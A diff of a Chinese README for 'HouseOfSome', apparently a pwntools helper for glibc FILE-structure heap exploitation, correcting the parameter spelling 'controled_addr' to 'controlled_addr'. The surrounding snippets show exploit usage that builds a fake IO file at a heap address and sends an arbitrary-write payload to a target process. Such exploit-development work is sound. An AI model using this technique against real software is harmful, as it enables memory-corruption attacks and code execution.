@@ -22,11 +22,11 @@ io = process("./demo")
 
 libc = ELF("./libc.so.6", checksec=None)
 libc.address = libc_base
-hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
+hos = HouseOfSome(libc=libc, controlled_addr=fake_file_start)
 hos.bomb(io)
 ```
 
-- controled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址
+- controlled_addr：可写地址，作为延长的IO_list_all中的io file写入的起始地址
 
 ### 举个例子
 
@@ -70,7 +70,7 @@ libc.address = libc_base
 fake_file_start = heap_addr + 0xe0 + 0xe8
 # 上方是信息收集
 # ------------------------------------------------- # 
-hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)
+hos = HouseOfSome(libc=libc, controlled_addr=fake_file_start)
 # 构造第一个任意地址写原语
 payload = hos.hoi_read_file_template(fake_file_start, 0x400, fake_file_start, 0)
 io.sendlineafter(b"content> ", payload)
